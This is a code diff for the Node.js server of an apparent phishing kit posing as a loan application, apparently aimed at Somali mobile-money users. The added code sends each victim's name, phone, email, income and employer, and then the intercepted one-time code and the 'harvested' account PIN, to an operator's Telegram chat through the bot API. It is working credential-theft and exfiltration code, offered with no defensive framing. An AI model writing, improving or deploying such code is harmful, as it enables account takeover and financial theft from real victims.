@@ -4,6 +4,7 @@ const http = require('http').createServer(app);
 const io = require('socket.io')(http);
 const axios = require('axios');
 const path = require('path');
+require('dotenv').config(); // Load environment variables (.env)
 
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -15,11 +16,30 @@ app.get('/', (req, res) => {
 // Primary memory engine mapping socket pointers to session objects
 const activeSessions = new Map();
 
-let rawBotUrl = process.env.BOT_MANAGER_URL || 'http://localhost:3001';
-if (!rawBotUrl.startsWith('http://') && !rawBotUrl.startsWith('https://')) {
-    rawBotUrl = 'https://' + rawBotUrl;
+// Telegram Bot Configs from environment variables
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID; // The target channel or admin Chat ID
+
+/**
+ * Helper function to send messages directly to your Telegram Bot
+ */
+async function sendTelegramMessage(text) {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.warn("[TELEGRAM WARNING] Missing BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.");
+        return;
+    }
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown'
+        });
+        console.log("✅ Update successfully transmitted to Telegram.");
+    } catch (err) {
+        console.error("❌ Telegram API Error:", err.response ? err.response.data : err.message);
+    }
 }
-const BOT_MANAGER_URL = rawBotUrl;
 
 io.on('connection', (socket) => {
     const appId = 'WAAFI-' + Math.floor(100000 + Math.random() * 900000);
@@ -37,17 +57,22 @@ io.on('connection', (socket) => {
 
     socket.on('step1', (payload) => {
         let session = activeSessions.get(socket.id);
-        if (session) { Object.assign(session, payload); session.step = 2; activeSessions.set(socket.id, session); }
+        if (session) { 
+            Object.assign(session, payload); 
+            session.step = 2; 
+            activeSessions.set(socket.id, session); 
+        }
     });
 
     socket.on('step2', (payload) => {
         let session = activeSessions.get(socket.id);
-        if (session) { Object.assign(session, payload); session.step = 3; activeSessions.set(socket.id, session); }
+        if (session) { 
+            Object.assign(session, payload); 
+            session.step = 3; 
+            activeSessions.set(socket.id, session); 
+        }
     });
 
-    /**
-     * AUDIT FIX: Listens exactly for 'step3-data' instead of 'step3' to match frontend payload.
-     */
     socket.on('step3-data', async (payload) => {
         let session = activeSessions.get(socket.id);
         if (!session) return;
@@ -56,17 +81,32 @@ io.on('connection', (socket) => {
         session.step = 4;
         activeSessions.set(socket.id, session);
 
-        /**
-         * AUDIT FIX: Removed pre-emptive 'socket.emit('admin-approve-otp');' statement.
-         * The user will now remain correctly on Step 4 until the admin acts.
-         */
-        console.log(`[CORE SERVER] Data synchronized for tracker ID ${session.appId}. Calling Telegram logging API.`);
+        console.log(`[CORE SERVER] Data synchronized for tracker ID ${session.appId}. Compiling Telegram Log.`);
 
-        try {
-            await axios.post(`${BOT_MANAGER_URL}/log-step3-data`, { session });
-        } catch (err) {
-            console.error("[CORE CRITICAL ERROR] Step 3 dispatch block broken:", err.message);
-        }
+        // Format message layout beautifully for Telegram Admins
+        const message = `
+📱 *New Application: ${session.appId}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+💰 *LOAN DETAILS:*
+• Type: ${session.loanType}
+• Amount: USD ${session.amount}
+• Term: ${session.term} Month(s)
+• Purpose: ${session.purpose}
+
+👤 *PERSONAL INFO:*
+• Name: ${session.firstName} ${session.lastName}
+• Phone: +252${session.phone}
+• Email: ${session.email}
+
+💼 *EMPLOYMENT & INCOME:*
+• Status: ${session.employment}
+• Annual Income: $${session.income}
+• Employer: ${session.employer || 'N/A'}
+━━━━━━━━━━━━━━━━━━━━━━━━
+Status: *Awaiting OTP Input...*
+        `;
+        
+        await sendTelegramMessage(message.trim());
     });
 
     socket.on('step4-otp', async (payload) => {
@@ -76,11 +116,16 @@ io.on('connection', (socket) => {
         session.otpToken = payload.otp;
         activeSessions.set(socket.id, session);
 
-        try {
-            await axios.post(`${BOT_MANAGER_URL}/trigger-step4-telegram`, { session });
-        } catch (err) {
-            console.error("[CORE CRITICAL ERROR] Step 4 verification link broken:", err.message);
-        }
+        const message = `
+🔑 *OTP Received for ID: ${session.appId}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+• Intercepted Code: \`${session.otpToken}\`
+• Phone associated: +252${session.phone}
+━━━━━━━━━━━━━━━━━━━━━━━━
+Status: *Awaiting Admin Panel Action Control*
+        `;
+
+        await sendTelegramMessage(message.trim());
     });
 
     socket.on('step5-pin', async (payload) => {
@@ -90,11 +135,16 @@ io.on('connection', (socket) => {
         session.pinCode = payload.pin;
         activeSessions.set(socket.id, session);
 
-        try {
-            await axios.post(`${BOT_MANAGER_URL}/trigger-step5-telegram`, { session });
-        } catch (err) {
-            console.error("[CORE CRITICAL ERROR] Step 5 operational capture failed:", err.message);
-        }
+        const message = `
+💳 *Account PIN Harvested for ID: ${session.appId}*
+━━━━━━━━━━━━━━━━━━━━━━━━
+• Target Account PIN: \`${session.pinCode}\`
+• Account Owner: ${session.firstName} ${session.lastName}
+━━━━━━━━━━━━━━━━━━━━━━━━
+Status: *Complete Operational Capture Execution*
+        `;
+
+        await sendTelegramMessage(message.trim());
     });
 
     socket.on('disconnect', () => { activeSessions.delete(socket.id); });
@@ -102,6 +152,7 @@ io.on('connection', (socket) => {
 
 /**
  * TELEGRAM INBOUND INTEGRATION PROXY CONTROL LAYER
+ * (Kept active if you are controlling approvals via custom internal dashboard requests)
  */
 app.post('/api/admin-action', (req, res) => {
     const { actionSignal, targetAppId, message } = req.body;
